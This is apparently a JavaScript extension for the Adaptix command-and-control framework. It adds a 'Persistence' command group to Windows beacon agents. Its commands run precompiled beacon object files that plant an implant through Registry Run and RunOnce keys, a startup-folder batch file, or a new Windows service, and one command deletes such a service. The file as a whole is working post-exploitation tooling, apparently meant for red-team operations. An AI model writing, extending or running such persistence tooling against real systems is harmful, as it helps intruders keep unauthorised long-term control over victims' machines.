var metadata = {
    name: "Persistence-BOF",
    description: "Persistence: registry run keys, services, startup folder"
};

var reg_run = ax.create_command("persist-run", "Add registry Run key persistence", "persist-run <name> [path]");
reg_run.addArgString("name", false, "Registry value name");
reg_run.addArgString("path", true, "Executable path (defaults to current)");
reg_run.setPreHook(function(id, cmdline, parsed) {
    let name = parsed[0] || "AdaptixAgent";
    let path = parsed[1] || "";
    let params = ax.bof_pack("int,str,str", [0, name, path]);
    let bof = ax.script_dir() + "_bin/registry." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Registry Run Persistence");
});

var reg_runonce = ax.create_command("persist-runonce", "Add registry RunOnce key persistence", "persist-runonce <name> [path]");
reg_runonce.addArgString("name", false, "Registry value name");
reg_runonce.addArgString("path", true, "Executable path (defaults to current)");
reg_runonce.setPreHook(function(id, cmdline, parsed) {
    let name = parsed[0] || "AdaptixAgent";
    let path = parsed[1] || "";
    let params = ax.bof_pack("int,str,str", [1, name, path]);
    let bof = ax.script_dir() + "_bin/registry." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Registry RunOnce Persistence");
});

var startup = ax.create_command("persist-startup", "Add startup folder batch persistence", "persist-startup <name> [path]");
startup.addArgString("name", false, "Batch file name");
startup.addArgString("path", true, "Executable path (defaults to current)");
startup.setPreHook(function(id, cmdline, parsed) {
    let name = parsed[0] || "agent";
    let path = parsed[1] || "";
    let params = ax.bof_pack("int,str,str", [2, name, path]);
    let bof = ax.script_dir() + "_bin/registry." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Startup Folder Persistence");
});

var svc_create = ax.create_command("persist-svc-create", "Create a Windows service", "persist-svc-create <name> [path]");
svc_create.addArgString("name", false, "Service name");
svc_create.addArgString("path", true, "Service binary path");
svc_create.setPreHook(function(id, cmdline, parsed) {
    let name = parsed[0] || "AdaptixSvc";
    let path = parsed[1] || "";
    let params = ax.bof_pack("int,str,str", [0, name, path]);
    let bof = ax.script_dir() + "_bin/service." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Create Service");
});

var svc_delete = ax.create_command("persist-svc-delete", "Delete a Windows service", "persist-svc-delete <name>");
svc_delete.addArgString("name", false, "Service name");
svc_delete.setPreHook(function(id, cmdline, parsed) {
    let name = parsed[0] || "AdaptixSvc";
    let params = ax.bof_pack("int,str,str", [1, name, ""]);
    let bof = ax.script_dir() + "_bin/service." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Delete Service");
});

var group = ax.create_commands_group("Persistence", [reg_run, reg_runonce, startup, svc_create, svc_delete]);
ax.register_commands_group(group, ["beacon", "beacon9090"], ["windows"], []);
